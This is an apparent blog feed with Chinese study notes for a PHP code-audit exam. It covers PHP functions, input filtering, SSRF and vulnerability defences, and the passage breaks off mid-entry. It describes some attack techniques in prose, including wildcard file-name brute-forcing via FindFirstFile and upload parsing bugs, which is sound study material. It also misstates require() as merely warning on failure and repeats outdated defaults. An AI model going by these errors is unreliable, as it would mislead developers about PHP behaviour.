<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-01-01T00:59:25.196Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计期末专题</title>
    <link href="http://example.com/2023/01/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/"/>
    <id>http://example.com/2023/01/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/</id>
    <published>2022-12-31T16:00:00.000Z</published>
    <updated>2023-01-01T00:59:25.196Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考试即将到来，复习刻不容缓。复习题由某群友整理得到。</p><span id="more"></span><h1 id="第1套试题"><a href="#第1套试题" class="headerlink" title="第1套试题"></a>第1套试题</h1><h2 id="第1题"><a href="#第1题" class="headerlink" title="第1题"></a>第1题</h2><p>在PHP中，数据会自动转换类型后再进行比较。</p><h3 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h3><p>检查数组中是否存在某个值，字符串区分大小写。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>在haystack中搜索needle，如果没有设置strict则使用宽松比较。<br>如果strict参数的值为true则in_array()函数还会检查needle的类型是否和haystack中的相同。<br>注意：在PHP 8.0.0 之前，string needle在非严格模式下将会匹配数组中的0，反之亦然。<br>返回值：如果找到needle则返回true，否则返回false<br><a href="https://www.php.net/manual/zh/function.in-array.php">in_array</a></p><h3 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric()函数"></a>is_numeric()函数</h3><p>检查变量是否为数字或数字字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>返回值：如果value是数字或数字字符串，返回true，否则返回false<br><a href="https://www.php.net/manual/zh/function.is-numeric.php">is_numeric</a></p><h2 id="第2题"><a href="#第2题" class="headerlink" title="第2题"></a>第2题</h2><h3 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a>extract()函数</h3><p>从数组中将变量导入到当前的符号表。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = EXTR_OVERWRITE, <span class="keyword">string</span> <span class="variable">$prefix</span> = <span class="string">&quot;&quot;</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure><ul><li>参数<br>array是一个关联数组。此函数会将键名当作变量名，值作为变量的值。对每个键&#x2F;值对都会在当前的符号表中建立变量，并受到flags和prefix的影响。必须使用关联数组，数字索引的数组将不会产生结果，除非用了EXTR_PREFIX_ALL或者EXTR_PREFIX_INVALID。<br>flags<br>对待非法&#x2F;数字和冲突的键名的方法将根据取出标记flags参数决定。可以是以下值之一：<br>EXTR_OVERWRITE如果有冲突，覆盖已有的变量<br>EXTR_SKIP如果有冲突，不覆盖已有的变量<br>EXTR_PREFIX_SAME如果有冲突，在变量名前加上前缀prefix<br>EXTR_PREFIX_ALL给所有变量名加上前缀prefix<br>EXTR_PREFIX_INVALID仅在非法&#x2F;数字的变量名前加上前缀prefix<br>EXTR_PREFIX_IF_EXISTS仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br>EXTR_REFS将变量名作为引用提取。<br>如果没有指定flags，则被假定为EXTR_OVERWRITE<br>prefix，注意prefix仅在flags的值是EXTR_PREFIX_SAME,EXTR_PREFIX_ALL,EXTR_PREFIX_INVALID或EXTR_PREFIX_EXISTS时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。</li></ul><p>返回值，返回成功导入到符号表中的变量数目。</p><p><a href="https://www.php.net/manual/zh/function.extract">extract</a></p><h2 id="第3题"><a href="#第3题" class="headerlink" title="第3题"></a>第3题</h2><h3 id="error-reporting-函数"><a href="#error-reporting-函数" class="headerlink" title="error_reporting()函数"></a>error_reporting()函数</h3><p>设置应该报告何种PHP错误。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(?<span class="keyword">int</span> <span class="variable">$error_level</span> = <span class="literal">null</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭所有PHP错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Report simple running errors</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// E_NOTICE是运行时的通知，显示基础提示信息</span></span><br><span class="line"><span class="comment">// E_PARSE是编译时的错误</span></span><br><span class="line"><span class="comment">// E_WARNING是运行时非致命的错误</span></span><br><span class="line"><span class="comment">// E_ERROR是运行时致命的错误</span></span><br><span class="line"><span class="comment">// (报告未初始化的变量或者捕获变量名的错误拼写)</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 除了 E_NOTICE，报告其他所有错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报告所有 PHP 错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报告所有 PHP 错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和 error_reporting(E_ALL); 一样</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;error_reporting&#x27;</span>, E_ALL);</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-error-reporting.html">error_reporting</a></p><h2 id="第4题"><a href="#第4题" class="headerlink" title="第4题"></a>第4题</h2><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p><code>php://filter</code> 是一种元封装器，设计用于数据流打开时的筛选过滤应用，这对于一体式的文件函数非常有用，类似于readfile(),file(),file_get_contents()，在数据流内容读取之前没有机会应用其它过滤器。<br><code>php://filter</code> 目标使用以下参数作为它路径的一部分。复合过滤链能够在一个路径上指定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;这个参数是必须的。它指定了要筛选过滤的参数</span><br><span class="line">read=&lt;读链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选链表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;; 两个链的筛选列表&gt;任何没有以read=或write=作前缀的筛选器列表会视情况应用于读或写链</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;filter</a></p><h2 id="第5题"><a href="#第5题" class="headerlink" title="第5题"></a>第5题</h2><h3 id="MySQL常用报错函数"><a href="#MySQL常用报错函数" class="headerlink" title="MySQL常用报错函数"></a>MySQL常用报错函数</h3><p><a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">看这篇博客即可</a></p><h3 id="htmlspeicalchars-函数"><a href="#htmlspeicalchars-函数" class="headerlink" title="htmlspeicalchars()函数"></a>htmlspeicalchars()函数</h3><p>将特殊字符转换为HTML实体</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$string</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span></span><br><span class="line">): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><ul><li><p>参数<br>string 待转换的string<br>flags  位掩码<br>encoding 一个可选参数，定义转换字符时使用的编码<br>double_encode 关闭double_encode时，PHP不会转换现有的HTML实体，默认是全部转换。</p></li><li><p>返回值<br>转换后的string</p></li></ul><p><a href="https://www.php.net/manual/zh/function.htmlspecialchars">htmlspeicalchars</a></p><h2 id="第6题"><a href="#第6题" class="headerlink" title="第6题"></a>第6题</h2><h3 id="FindFirstFile-函数"><a href="#FindFirstFile-函数" class="headerlink" title="FindFirstFile()函数"></a>FindFirstFile()函数</h3><p>根据文件名查找文件。该函数到一个文件夹(包括子文件夹)去搜索指定文件 如果要使用附加属性去搜索文件的话 可以使用FindFirstFileEx函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE WINAPI <span class="title function_ invoke__">FindFirstFile</span>(</span><br><span class="line">_In_   LPCTSTR lpFileName,</span><br><span class="line">_Out_  LPWIN32_FIND_DATA lpFindFileData</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><p>参数<br>IpFileName 用于指定搜索目录和文件类型，可以用通配符，初次使用注意需要用转义字符（\）表达<br>IpFindFileData 用于保存搜索得到的文件信息。</p></li><li><p>返回值<br>返回HANDLE类型，为下一次搜索提供信息。当搜索失败时，返回INVALID_HANDLE_VALUE</p></li><li><p>利用方法<br>将文件名不可知部分之后的字符串用“&lt;”或“&gt;”代替即可。需要注意，只使用一个“&lt;”或“&gt;”则只能代表一个字符。如果文件名是12345或更长，这时候请求“1&lt;”或“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，可通过该方式爆破目录文件。</p></li></ul><h2 id="第7题"><a href="#第7题" class="headerlink" title="第7题"></a>第7题</h2><h3 id="escapeshellarg-函数"><a href="#escapeshellarg-函数" class="headerlink" title="escapeshellarg()函数"></a>escapeshellarg()函数</h3><p>把字符串转义为可以在shell命令里使用的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellarg</span>(<span class="keyword">string</span> <span class="variable">$arg</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。<br>在 Windows 上，escapeshellarg() 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线()都会被一个额外的反斜线所转义。</p><ul><li>返回值<br>转换之后的字符串<br><a href="https://www.php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></li></ul><h3 id="strip-tags-函数"><a href="#strip-tags-函数" class="headerlink" title="strip_tags()函数"></a>strip_tags()函数</h3><p>从字符串中去除HTML和PHP标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip_tags(string $string, array|string|null $allowed_tags = null): string</span><br></pre></td></tr></table></figure><ul><li>参数<br>allowed_tags,使用可选的第二个参数指定不被去除的标签列表。要么是 string，要么自 PHP 7.4.0 起是 array。</li><li>返回值<br>返回处理后的字符串<br><a href="https://www.php.net/manual/zh/function.strip-tags">strip_tags</a></li></ul><h3 id="addslashes-函数"><a href="#addslashes-函数" class="headerlink" title="addslashes()函数"></a>addslashes()函数</h3><p>使用反斜线引用字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>(<span class="keyword">string</span> <span class="variable">$string</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>返回需要在转义字符之前添加反斜线的字符串。这些字符是：<br>单引号（’）<br>双引号（”）<br>反斜线（\）<br>NUL（NUL 字节）</p><p><a href="https://www.php.net/manual/zh/function.addslashes">addslashes</a></p><h3 id="mysql-real-escape-string-函数"><a href="#mysql-real-escape-string-函数" class="headerlink" title="mysql_real_escape_string()函数"></a>mysql_real_escape_string()函数</h3><p>转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集<br>警告：本扩展自 PHP 5.5.0 起已废弃，并在自 PHP 7.0.0 开始被移除。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="keyword">string</span> <span class="variable">$unescaped_string</span>, resource <span class="variable">$link_identifier</span> = <span class="literal">NULL</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.mysql-real-escape-string">mysql_real_escape_string</a></p><h2 id="第8题"><a href="#第8题" class="headerlink" title="第8题"></a>第8题</h2><h3 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h3><p>RSA算法，DSA算法，ECC算法，DH算法，SM2算法</p><h3 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h3><p>AES算法，DES算法，3DES算法，RC算法，SM1算法</p><h2 id="第9题"><a href="#第9题" class="headerlink" title="第9题"></a>第9题</h2><p>验证码更多放在会话（Session）中</p><h2 id="第10题"><a href="#第10题" class="headerlink" title="第10题"></a>第10题</h2><p>预防撞库攻击的方式：</p><ul><li>强制用户密码的强度。</li><li>定期强制用户更换密码</li><li>在账户相关接口加强人机防控策略</li><li>重要业务流程采用二次验证</li><li>建立业务维度的账号异常指标监控，并及时处理风险账号</li><li>借助安全工具做好防撞库攻击</li></ul><h2 id="第11题"><a href="#第11题" class="headerlink" title="第11题"></a>第11题</h2><h3 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h3><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。<br>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。<br>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p><h2 id="第12题"><a href="#第12题" class="headerlink" title="第12题"></a>第12题</h2><p>充值支付漏洞的主要应对方法：<br>后端检查每一项值，包括支付状态。商品单价及总价不能从客户端获取。<br>校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量不能超过65535。<br>与第三方支付平台检查，实际支付的金额是否与订单金额一致。<br>如果给用户退款，要使用原路、原订单退回。<br>支付参数进行 MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题。<br>金额超过阈值，进行人工审核</p><h2 id="第13题"><a href="#第13题" class="headerlink" title="第13题"></a>第13题</h2><h3 id="iconv-函数"><a href="#iconv-函数" class="headerlink" title="iconv()函数"></a>iconv()函数</h3><p>字符串按要求的字符编码来转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv(string $in_charset, string $out_charset, string $str): string</span><br></pre></td></tr></table></figure><p>将字符串 str 从 in_charset 转换编码到 out_charset。</p><ul><li>参数<br>in_charset,输入的字符集。<br>out_charset,输出的字符集。<br>str,要转换的字符串</li><li>返回值<br>返回转换后的字符串，或者在失败后返回false<br><a href="https://www.php.net/manual/zh/function.iconv">iconv</a></li></ul><h2 id="第14题"><a href="#第14题" class="headerlink" title="第14题"></a>第14题</h2><h3 id="is-null-函数"><a href="#is-null-函数" class="headerlink" title="is_null()函数"></a>is_null()函数</h3><p>检测变量是否为null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_null</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><ul><li>返回值<br>如果value为null，返回true，否则返回false</li></ul><h2 id="第15题"><a href="#第15题" class="headerlink" title="第15题"></a>第15题</h2><h3 id="PHP禁用函数"><a href="#PHP禁用函数" class="headerlink" title="PHP禁用函数"></a>PHP禁用函数</h3><p>PHP禁用函数的方法：首先打开“php.ini”配置文件；然后查找字符“disable_functions”，该字符是PHP禁用函数的配置项；接着在该配置项加上需要禁用的函数，多个函数用英文逗号分隔；最后保存重启即可。</p><h2 id="第16题"><a href="#第16题" class="headerlink" title="第16题"></a>第16题</h2><h3 id="require-函数"><a href="#require-函数" class="headerlink" title="require()函数"></a>require()函数</h3><p>文件包含过程中出现错误，抛出警告，之后继续正常执行</p><h2 id="第17题"><a href="#第17题" class="headerlink" title="第17题"></a>第17题</h2><h3 id="unlink-函数"><a href="#unlink-函数" class="headerlink" title="unlink()函数"></a>unlink()函数</h3><p>删除文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>删除 filename。和 Unix C 的 unlink() 函数相似。 发生错误时会产生一个 E_WARNING 级别的错误。</p><ul><li>参数<br>filename,文件的路径。如果文件是符号链接，将会删除符号链接。在Windows上，删除目录的符号链接，必须使用rmdir()<br>context,上下文流（context stream）resource</li><li>返回值<br>成功时返回true，或在失败时返回false</li></ul><h2 id="第18题"><a href="#第18题" class="headerlink" title="第18题"></a>第18题</h2><h3 id="system-函数"><a href="#system-函数" class="headerlink" title="system()函数"></a>system()函数</h3><p>执行外部程序，并且显示输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>本函数执行 command 参数所指定的命令，并且输出执行结果。<br>如果 PHP 运行在服务器模块中，system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。<br>如果要获取一个命令未经任何处理的原始输出，请使用 passthru() 函数。</p><ul><li>返回值<br>成功则返回命令输出的最后一行，失败则返回false</li></ul><h2 id="第19题"><a href="#第19题" class="headerlink" title="第19题"></a>第19题</h2><h3 id="绝对等于-x3D-x3D-x3D"><a href="#绝对等于-x3D-x3D-x3D" class="headerlink" title="绝对等于(&#x3D;&#x3D;&#x3D;)"></a>绝对等于(&#x3D;&#x3D;&#x3D;)</h3><p>如果x等于y，且它们类型相同，则返回true。比较时不做类型转换</p><h2 id="第20题"><a href="#第20题" class="headerlink" title="第20题"></a>第20题</h2><h3 id="程序目录结构"><a href="#程序目录结构" class="headerlink" title="程序目录结构"></a>程序目录结构</h3><ol><li>函数集文件，通常命名中包含functions或common等关键字，这些文件里面是一些公共的函数，提供其他文件统一调用，所以大多数文件都会在文件头部包含到其它文件。寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。</li><li>配置文件，通常命名中包括config关键字，配置文件包括Web程序运行必须的功能性配置选项以及数据库等配置信息。从这个文件中可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用双引号括起来，如果是双引号，则很可能会存在代码执行漏洞。</li><li>安全过滤文件，安全过滤文件对我们做代码审计至关重要，关系到我们挖掘到的可疑点能不能利用，通常命名中有filter、safe、check等关键字，这类文件主要是对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数，其他的则相对少见。而目前大多数应用都会在程序的入口循环对所有参数使用addslashes()函数进行过滤。</li><li>index文件，index是一个程序的入口文件，所以通常我们只要读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件，其中核心的文件又有哪些。而不同目录的index文件也有不同的实现方式，建议最好先将几个核心目录的index文件都简单读一遍。</li></ol><h2 id="第21题"><a href="#第21题" class="headerlink" title="第21题"></a>第21题</h2><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>文件上传漏洞在代码审计的时候，最快的方法就是直接去搜索 <code>move_uploaded_file()</code> 函数，再去看调用这个函数上传文件的代码存不存在未限制上传格式或者可以绕过，其中问题比较多的是黑名单限制文件格式以及未更改文件名的方式，没有更改文件名的情况下，在Apache利用其向前寻找解析格式和IIS6的分号解析bug都可以执行代码。</p><h2 id="第22题"><a href="#第22题" class="headerlink" title="第22题"></a>第22题</h2><h3 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h3><p>执行一个正则表达式的搜索和替换。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure><p>搜素subject中匹配pattern的部分，以replacement进行替换。</p><ul><li><p>参数<br>pattern,要搜索的模式。可以是一个字符串或字符串数组。<br>replacement,用于替换的字符串或字符串数组。<br>subject,要进行搜索和替换的字符串或字符串数组。<br>limit,每个模式在每个subject上进行替换的最大次数。默认是-1(无限)<br>count,如果指定，将会被填充为完成的替换次数。</p></li><li><p>返回值<br>如果subject是一个数组，preg_replace()返回一个数组，其他情况下返回一个字符串。<br>如果匹配被查找到，替换后的 subject 被返回，其他情况下返回没有改变的 subject。如果发生错误，返回 null 。</p></li></ul><p><a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace</a></p><h2 id="第23题"><a href="#第23题" class="headerlink" title="第23题"></a>第23题</h2><p>函数escapeshellarg()的功能是过滤参数，将参数限制在一对双引号里，确保参数为一个字符串，把双引号替换为空格。<br>详细见<strong>第7题</strong>的内容</p><h2 id="第24题"><a href="#第24题" class="headerlink" title="第24题"></a>第24题</h2><p><code>import_request_variables()</code> 函数作用是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候，需要PHP 4.1至5.4之间的版本，不过建议是不开启register_globals也不要使用import_request_variables()函数，这样容易导致变量覆盖。</p><h2 id="第25题"><a href="#第25题" class="headerlink" title="第25题"></a>第25题</h2><p>常见的代码审计思路：<br>1）根据敏感关键字回溯参数传递过程。 2）查找可控变量，正向追踪变量传递过程。 3）寻找敏感功能点，通读功能点代码。</p><h2 id="第26题"><a href="#第26题" class="headerlink" title="第26题"></a>第26题</h2><p>需要先构造好利用代码写入网站保存，在第二次或多次请求后调用攻击代码触发或者修改配置触发的漏洞叫做二次漏洞。</p><h1 id="第2套试题"><a href="#第2套试题" class="headerlink" title="第2套试题"></a>第2套试题</h1><h2 id="第1题-1"><a href="#第1题-1" class="headerlink" title="第1题"></a>第1题</h2><h3 id="全局变量注册开关"><a href="#全局变量注册开关" class="headerlink" title="全局变量注册开关"></a>全局变量注册开关</h3><p>register_globals即全局注册变量开关，register_globals是php.ini文件里面的一个安全设置选项。<br>当选项关闭的时候，PHP使用$_GET,$_POST,$_COOKIE或$_SESSION等数组来接收客户端传递过来的参数；<br>当选项开启的时候，客户端传过来的参数会被直接注册为全局变量来使用。</p><h3 id="allow-url-include参数（只影响RFI，不影响LFI）"><a href="#allow-url-include参数（只影响RFI，不影响LFI）" class="headerlink" title="allow_url_include参数（只影响RFI，不影响LFI）"></a>allow_url_include参数（只影响RFI，不影响LFI）</h3><p>是否允许includeI()和require()函数包含URL（HTTP，HTTPS）作为文件处理</p><h3 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h3><p>默认情况下，PHP 指令 magic_quotes_gpc 为 on，它主要是对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes ()。 不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes ()，因为这样会导致双层转义。 遇到这种情况时可以使用函数 get_magic_quotes_gpc () 进行检测。</p><h3 id="magic-quotes-runtime"><a href="#magic-quotes-runtime" class="headerlink" title="magic_quotes_runtime"></a>magic_quotes_runtime</h3><p>在php.ini的配置文件中，有个布尔值的设置，就是magic_quotes_runtime,当它打开时，php的大部分函数自动的给从外部引入的 (包括数据库或者文件)数据中的溢出字符加上反斜线。 当然如果重复给溢出字符加反斜线，那么字符串中就会有多个反斜线，所以这时就要用set_magic_quotes_runtime ()与 get_magic_quotes_runtime ()设置和检测php.ini文件中magic_quotes_runtime状态。</p><h2 id="第2题-1"><a href="#第2题-1" class="headerlink" title="第2题"></a>第2题</h2><p>参考第1套试题的第8题。</p><h2 id="第3题-1"><a href="#第3题-1" class="headerlink" title="第3题"></a>第3题</h2><p>常用验证码类型：</p><ol><li>数字、字母、中文组合</li><li>图片识别</li><li>滑动验证</li><li>短信&#x2F;邮箱&#x2F;电话验证</li><li>语音验证<br>本题属于题目有误，无正确答案</li></ol><h2 id="第4题-1"><a href="#第4题-1" class="headerlink" title="第4题"></a>第4题</h2><h3 id="call-user-func-函数"><a href="#call-user-func-函数" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h3><p>把第一个参数作为回调函数调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数</p><ul><li>参数<br>callback,将被调用的回调函数<br>args,0个或以上的参数，被传入回调函数</li></ul><h3 id="可能造成代码执行漏洞的函数"><a href="#可能造成代码执行漏洞的函数" class="headerlink" title="可能造成代码执行漏洞的函数"></a>可能造成代码执行漏洞的函数</h3><p>system, exec, shell_exec, passthru, eval, assert, preg_replace, call_user_func</p><h2 id="第5题-1"><a href="#第5题-1" class="headerlink" title="第5题"></a>第5题</h2><p>命令执行漏洞的防御：</p><ol><li>使用自定义函数或者函数库来代替外部命令的功能。</li><li>使用escapeshellarg函数来处理命令参数</li><li>使用safe_mode_exec_dir指定可执行文件的命令</li><li>使用白名单对可包含文件进行限制</li><li>严格检查include类的文件包含函数中的参数是否外界可控。</li></ol><h2 id="第6题-1"><a href="#第6题-1" class="headerlink" 